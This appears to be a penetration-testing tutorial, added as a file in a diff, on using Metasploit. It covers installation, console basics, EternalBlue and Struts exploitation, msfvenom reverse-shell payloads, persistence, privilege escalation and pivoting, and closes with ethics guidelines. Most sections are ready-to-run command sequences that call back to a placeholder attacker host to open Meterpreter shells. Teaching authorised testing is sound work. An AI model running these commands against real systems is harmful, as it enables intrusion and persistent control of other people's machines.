@@ -1,0 +1,203 @@
+
+Author: g3n3ric
+
+Extensive Metasploit Tutorial
+
+---
+
+Introduction to Metasploit Framework
+
+The Metasploit Framework, developed by Rapid7, is one of the most powerful tools for penetration testing, enabling security professionals to exploit vulnerabilities, conduct security assessments, and manage exploitation activities efficiently.
+
+This comprehensive tutorial covers setup, usage, practical exploitation, post-exploitation techniques, troubleshooting, and best practices for ethical penetration testing.
+
+---
+
+1. Complete Setup Instructions (Linux, Windows, macOS)
+
+Linux (Kali Linux):
+
+- Pre-installed on Kali Linux; update regularly:
+```
+sudo apt update
+sudo apt install metasploit-framework
+```
+
+Linux (Ubuntu/Debian):
+```
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod +x msfinstall
+sudo ./msfinstall
+```
+
+Windows:
+
+- Download Metasploit Community/Pro installer from https://www.metasploit.com/download.
+- Run installer and follow on-screen instructions.
+
+macOS:
+```
+brew install metasploit
+```
+
+Verify Installation:
+```
+msfconsole
+```
+
+---
+
+2. Metasploit Console Deep Dive
+
+Launching Metasploit:
+```
+msfconsole
+```
+
+Basic Commands:
+- `help`: List commands.
+- `search exploit_name`: Find exploits.
+- `use exploit/windows/smb/ms17_010_eternalblue`: Select exploit.
+- `show options`: View settings.
+- `set RHOSTS 192.168.1.100`: Set target host.
+- `set payload windows/x64/meterpreter/reverse_tcp`: Set payload.
+- `exploit`: Launch exploit.
+
+Modules Overview:
+- Exploits: Code to exploit vulnerabilities.
+- Payloads: Delivered after successful exploit.
+- Auxiliary: Scanners, enumeration scripts.
+- Encoders: Avoid detection by antivirus.
+
+---
+
+3. Real-world Exploitation Scenarios
+
+**SMB (EternalBlue)**:
+- Vulnerability: MS17-010.
+- Exploit:
+```
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST attacker_IP
+exploit
+```
+
+**Web Application Exploitation**:
+- Example: Exploiting vulnerable Apache Struts:
+```
+use exploit/multi/http/struts2_content_type_ognl
+set RHOSTS target_IP
+set TARGETURI /app
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST attacker_IP
+exploit
+```
+
+**Client-Side Exploitation**:
+- Generate malicious payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f exe > payload.exe
+```
+- Listener setup:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST attacker_IP
+set LPORT 4444
+exploit
+```
+
+---
+
+4. Payload Creation and Management
+
+Payload Creation with msfvenom:
+- Windows reverse shell:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f exe -o shell.exe
+```
+- Linux reverse shell:
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f elf -o shell.elf
+```
+
+Managing Payload Sessions:
+- Session handling:
+```
+sessions -l
+sessions -i 1
+```
+
+- Upgrading Shells to Meterpreter:
+```
+sessions -u 1
+```
+
+---
+
+5. Detailed Post-Exploitation Strategies
+
+**Persistence**:
+- Scheduled Task (Windows):
+```
+run persistence -X -i 30 -p 4444 -r attacker_IP
+```
+
+**Privilege Escalation**:
+- Automated escalation:
+```
+getsystem
+```
+- Manual enumeration:
+```
+run post/multi/recon/local_exploit_suggester
+```
+
+**Pivoting (Lateral Movement)**:
+- Routing through compromised hosts:
+```
+run autoroute -s subnet
+```
+
+---
+
+6. Troubleshooting Common Issues
+
+- **Connection issues**:
+  Ensure no firewall blocks traffic.
+- **Payloads not executing**:
+  Verify payload compatibility with target OS/architecture.
+- **Sessions dropping**:
+  Use stable payloads (`meterpreter/reverse_tcp`).
+
+Logs and Debugging:
+- Enable verbose mode:
+```
+set verbose true
+```
+
+---
+
+7. Ethical Hacking Guidelines and Best Practices
+
+- Always have written permission and defined scope.
+- Clearly communicate the purpose and time of testing to stakeholders.
+- Report all discovered vulnerabilities responsibly.
+- Protect sensitive information acquired during tests.
+
+---
+
+8. Extensive External References and Resources
+
+- Official documentation: https://docs.metasploit.com
+- Metasploit Unleashed (Offensive Security): https://www.offensive-security.com/metasploit-unleashed
+- Exploit Database: https://www.exploit-db.com
+- Rapid7 Community: https://community.rapid7.com
+
+---
+
+Conclusion
+
+Mastering Metasploit requires continual practice, exploration, and ethical discipline. Regularly update skills through official resources and community engagement to remain effective and responsible as a penetration tester.
